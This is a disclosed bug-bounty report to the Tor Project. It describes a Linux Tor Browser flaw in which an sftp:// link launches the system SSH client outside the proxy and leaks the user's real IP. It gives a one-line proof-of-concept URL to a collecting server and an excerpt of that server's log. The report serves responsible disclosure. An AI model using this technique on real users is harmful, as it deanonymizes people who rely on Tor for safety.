# Linux TBB SFTP URI allows local IP disclosure

## Report Details
- **Report ID**: 253429
- **URL**: https://hackerone.com/reports/253429
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2017-07-26T02:31:31.667Z
- **Disclosed**: 2017-10-25T21:58:22.196Z

## Reporter
- **Username**: rethink5807
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: torproject

## Vulnerability Information
Browsing to a simple URL to an sftp URI allows bypasses socks proxy for DNS and browsing.
Tested on a clean install of Ubuntu 16.04 with TBB 7.0.2 (4097d43aa0be86ae3fe43ec8f3ac5394) download from https://www.torproject.org/dist/torbrowser/7.0.2/tor-browser-linux64-7.0.2_en-US.tar.xz
 
POC:
Navigate to sftp://104.131.180.179:80/index.php

After ~1 minute check http://104.131.180.179/ip,txt for your IP address

It appears that ubuntu's default SSH client is associated with this URI which causes the client to attempt the connection on behalf of the user. The windows TBB does not appear to be affected. 

Excerpt from apache logs:
apache2: [core:error] [pid 10671] [client x.x.x.x:40063] AH00126: Invalid URI in request SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.1

Not surprisingly, the client can also be directed to local resources as well.


## Attachments
No attachments
